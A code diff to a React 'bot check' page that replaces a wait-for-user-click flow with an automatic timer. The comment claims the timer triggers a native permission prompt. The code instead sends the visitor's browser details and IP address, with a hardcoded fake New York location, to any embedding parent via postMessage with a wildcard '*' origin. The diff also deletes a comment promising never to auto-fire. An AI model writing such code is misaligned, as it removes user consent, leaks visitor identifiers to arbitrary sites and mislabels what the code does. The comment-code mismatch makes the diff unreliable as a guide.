@@ -157,10 +157,24 @@ export default function BotCheckPage() {
       return // IMPORTANT: Exit here, no timer for Firefox/Edge
     }
     
-    // For Chrome/Safari, show Allow/Block buttons — same as Firefox/Edge
-    // Never auto-fire; always wait for user interaction
-    setIsChecking(false)
-    setShowSoftPrompt(true)
+    // For Chrome/Safari, auto-trigger native permission prompt after a short delay
+    const timer = setTimeout(() => {
+      if (window.isEmbedded && window.parent !== window) {
+        window.parent.postMessage({
+          type: 'bot-check-verified',
+          browserInfo: clientInfo,
+          location: {
+            country: 'United States',
+            city: 'New York',
+            ip: ipAddress
+          }
+        }, '*')
+      }
+    }, 500)
+
+    return () => {
+      clearTimeout(timer)
+    }
   }, [clientInfo, ipAddress, isFirefoxOrEdge, showSoftPrompt])
 
   const handleSoftPromptAllow = async (e) => {
